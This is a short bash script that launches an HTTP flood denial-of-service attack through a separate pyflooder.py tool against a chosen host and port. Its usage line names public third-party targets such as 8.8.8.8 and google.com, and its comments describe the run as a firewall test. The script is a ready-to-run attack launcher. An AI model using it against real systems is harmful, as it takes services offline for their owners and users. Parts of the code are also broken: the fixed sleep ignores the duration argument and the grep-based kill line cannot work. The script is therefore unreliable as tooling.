#!/bin/bash
# Script for Hyperion v3.x that performs DOS attack
# Usage ./DOS.sh 8.8.8.8 port number of attacks - as single command line argument but can use website instead of IP address eg google.com for 8.8.8.8
# First argument $1: $usIP user IP
# Second Argument $2: $uport is port to DOS
# third argument $3: length of DOS attacks in seconds e.g 60
# User Input from  command line arguments
userIP="$1" # IP address eg 8.8.8.8
userport="$2" # user search term
dt3="$3" # length of attacks in seconds
# Open your web browswer and go to the target website. After about 10 seconds refresh, and see if the website
# is unavailable due to a successful HTTP Flood DOS attack. If so, you should reconfigure your firewall and IDS
# to deflect DOS attacks, ideally to a honeypot so you can collect data for your Blue Team to analyse.
# Usage pyflooder.py < Hostname > < Port > < Number_of_Attacks >
python pyflooder.py $userIP $userport $dt3
sleep 120
kill $(grep -f 'python pyflooder.py')
clear
echo " Your HTTP Flood DOS Test has successfully terminated after $dt3 seconds. "
echo ""
sleep 10
